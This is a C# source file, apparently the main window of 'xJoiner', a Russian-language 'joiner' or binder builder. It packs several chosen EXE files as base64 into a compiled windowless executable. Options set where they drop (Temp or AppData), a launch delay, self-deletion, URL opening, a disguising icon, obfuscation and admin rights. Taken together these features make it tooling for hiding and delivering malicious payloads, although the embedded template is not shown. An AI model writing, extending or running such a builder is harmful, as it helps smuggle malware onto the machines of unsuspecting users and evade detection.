﻿using System;
using System.CodeDom.Compiler;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Text;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Data;
using System.Windows.Documents;
using System.Windows.Input;
using System.Windows.Media;
using System.Windows.Media.Imaging;
using System.Windows.Navigation;
using System.Windows.Shapes;
using MahApps.Metro.Controls;
using MahApps.Metro.Controls.Dialogs;
using Microsoft.CSharp;
using Microsoft.Win32;
using System.Threading;

namespace xJoiner
{
    /// <summary>
    /// Логика взаимодействия для MainWindow.xaml
    /// </summary>
    public partial class MainWindow : MetroWindow
    {
        public string curr_dir = Environment.CurrentDirectory + "\\";
        public MainWindow()
        {
            InitializeComponent();
            AddLog("[INFO] Автор программы: http://vityasteam.space");
            
        }

        void AddLog(string text)
        {
            Dispatcher.BeginInvoke((Action)delegate
            {
                LogBox.Text += text + "\r\n";
            });
        }

        public async void msg(string text, string title)
        {
            await this.ShowMessageAsync(title, text);
        }

        private void ContextMenu_Opened(object sender, RoutedEventArgs e)
        {
            if(lstFiles.Items.Count >= 5){
                AddItem.IsEnabled = false;
            }
            else
            {
                AddItem.IsEnabled = true;
            }
        }

        private void AddItem_Click(object sender, RoutedEventArgs e)
        {
            OpenFileDialog openFileDialog = new OpenFileDialog();
            openFileDialog.Multiselect = false;
            openFileDialog.Filter = "EXE Files (*.exe) | *.exe";
            if (openFileDialog.ShowDialog() == true)
            {
                lstFiles.Items.Add(openFileDialog.FileName);
                AddLog("[INFO] Файл №" + lstFiles.Items.Count + " добавлен!");

            }
        }

        private void MenuItem_Click(object sender, RoutedEventArgs e)
        {
            if (lstFiles.SelectedIndex != -1)
            {
                AddLog("[INFO] Файл №" + (lstFiles.SelectedIndex + 1) + " удален!");
                lstFiles.Items.Remove(lstFiles.SelectedItem);
            }
        }

        private void Button_Click(object sender, RoutedEventArgs e)
        {
            SaveFileDialog svf = new SaveFileDialog();
            svf.Title = "xJoiner by vityaSteam | Сохранение билда";
            svf.DefaultExt = "exe";
            if (svf.ShowDialog() == false)
                return;
            string SavePath = svf.FileName;
            string path = "";
            switch (PathCombo.SelectedIndex)
            {
                case 0:
                    path = System.IO.Path.GetTempPath();
                    break;
                case 1:
                    path = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\";
                    break;
                case 2:
                    path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\";
                    break;
                default:
                    path = System.IO.Path.GetTempPath();
                    break;
            }

            Stream stream = Assembly.GetExecutingAssembly().GetManifestResourceStream("xJoiner.Source.source.txt");

            if (stream != null)
            {
                using (var reader = new StreamReader(stream))
                {
                    int delay = 0;
                    switch (DelayBox.SelectedIndex)
                    {
                        case 0:
                            delay = 0;
                            break;
                        case 1:
                            delay = 500;
                            break;
                        case 2:
                            delay = 1000;
                            break;
                        case 3:
                            delay = 5000;
                            break;
                        case 4:
                            delay = 10000;
                            break;

                    }
                    string code = reader.ReadToEnd();
                    string fpatch = "";
                    for (int i = 0; i < lstFiles.Items.Count; i++)
                    {
                        byte[] res = File.ReadAllBytes(lstFiles.Items[i].ToString());
                        fpatch += Convert.ToBase64String(res) + ";";
                    }
                    bool autodel = false;
                    if(AutoDelBox.IsChecked == true)
                    {
                        autodel = true;
                    }
                    else
                    {
                        autodel = false;
                    }
                    bool urlgo = false;
                    if (UrlGoTurn.IsOn == true)
                    {
                        urlgo = true;
                    }
                    else if (UrlGoTurn.IsOn == false)
                    {
                        urlgo = false;

                    }


                    code = code.Replace("###", fpatch).Replace("$$$", path).Replace("***", delay.ToString()).Replace(">>>", autodel.ToString().ToLower()).Replace("%url_state", urlgo.ToString().ToLower()).Replace("%url", UrlGoBox.Text.Replace("https://", "").Replace("http://", ""))
                        .Replace("%type_locate", TypeNavigateUrl.SelectedIndex.ToString());


                    var compiler = new Dictionary<string, string>
                    {
                        { "CompilerVersion", "v2.0" }
                    };

                    CompilerResults results;

                    using (var provider = new CSharpCodeProvider(compiler))
                    {
                        var args = new CompilerParameters { OutputAssembly = SavePath, GenerateExecutable = true, CompilerOptions = "/t:winexe" };
                        args.ReferencedAssemblies.Add("System.dll");
                        args.ReferencedAssemblies.Add("System.Data.dll");
                        if (IconBox.Text != "")
                        {
                            args.CompilerOptions = "/win32icon:\"" + IconBox.Text + "\"";
                        }
                        
                        results = provider.CompileAssemblyFromSource(args, code);
                    }
                    if (results.Errors.Count == 0)
                    {
                        AddLog("[SUCCESS] Билд был скомпилирован");
                        if (ObfucateBox.IsChecked == true)
                        {
                            Obfucate(SavePath);
                        }
                    }
                    foreach (CompilerError compilerError in results.Errors)
                    {
                        AddLog(string.Format("[ERROR] Ошибка: {0}", compilerError.ErrorText + " Строка: " + compilerError.Line));
                    }
                }
            }
            else
            {
                AddLog("[ERROR] Ошибка открытия!");
            }
        }

        void CMD(string cmd)
        {
            System.Diagnostics.Process process = new System.Diagnostics.Process();
            System.Diagnostics.ProcessStartInfo startInfo = new System.Diagnostics.ProcessStartInfo();
            startInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
            startInfo.FileName = "cmd.exe";
            startInfo.Arguments = "/C " + cmd;
            process.StartInfo = startInfo;
            process.Start();
        }

        void Obfucate(string name)
        {
            string rights = "0";
            if(AdminBox.IsChecked == true)
            {
                rights = "1";
            }
            else
            {
                rights = "0";
            }
            CMD(curr_dir + "Tools\\dotNET_Reactor.Console.exe -admin " + rights + " -embed 1 -obfuscation 1 -obfuscate_public_types 1 -stringencryption 1 -prejit 1 -file \"" + name + "\"");
            AddLog("[INFO] Обфуцированный файл сохранен в папку: " + name + "_Secure");
        }

        private void ObfucateBox_Checked(object sender, RoutedEventArgs e)
        {
            if(ObfucateBox.IsChecked == true)
            {
                AdminBox.IsEnabled = true;
            }else if(ObfucateBox.IsChecked == false)
            {
                AdminBox.IsEnabled = false;
                AdminBox.IsChecked = false;
            }
        }

        private void Button_Click_1(object sender, RoutedEventArgs e)
        {
            OpenFileDialog openFileDialog = new OpenFileDialog();
            openFileDialog.Multiselect = false;
            openFileDialog.Filter = "Icon Files (*.ico) | *.ico";
            if (openFileDialog.ShowDialog() == true)
            {
                IconBox.Text = openFileDialog.FileName;

                string selectedFileName = openFileDialog.FileName;
                BitmapImage bitmap = new BitmapImage();
                bitmap.BeginInit();
                bitmap.UriSource = new Uri(selectedFileName);
                bitmap.EndInit();
                IconImage.Source = bitmap;
                AddLog("[INFO] Иконка билда была установлена!");
            }
        }

        private void Button_Click_2(object sender, RoutedEventArgs e)
        {
            IconBox.Text = "";
            IconImage.Source = new BitmapImage(new Uri("Images/nothing.png", UriKind.Relative));
            AddLog("[INFO] Иконка билда была удалена!");
        }

        private void Label_MouseLeftButtonDown(object sender, MouseButtonEventArgs e)
        {
            Process.Start(UrlBox.Text);
        }

        private void Button_Click_3(object sender, RoutedEventArgs e)
        {
            InfoWindow window = new InfoWindow();
            window.ShowDialog();
        }

        private void Button_Click_4(object sender, RoutedEventArgs e)
        {
            LogBox.Text = "";
        }

        private void LogBox_TextChanged(object sender, TextChangedEventArgs e)
        {
            if(LogBox.Text != "")
            {
                ClearLogBtn.IsEnabled = true;
            }
            else
            {
                ClearLogBtn.IsEnabled = false;

            }
        }

        private void UrlGoTurn_MouseLeftButtonDown(object sender, MouseButtonEventArgs e)
        {

        }

        private void UrlGoTurn_Toggled(object sender, RoutedEventArgs e)
        {
            if (UrlGoTurn.IsOn == true)
            {
                UrlGoBox.IsEnabled = true;
                TypeNavigateUrl.IsEnabled = true;
            }
            else if (UrlGoTurn.IsOn == false)
            {
                UrlGoBox.IsEnabled = false;
                TypeNavigateUrl.IsEnabled = false;

            }
        }
    }
}
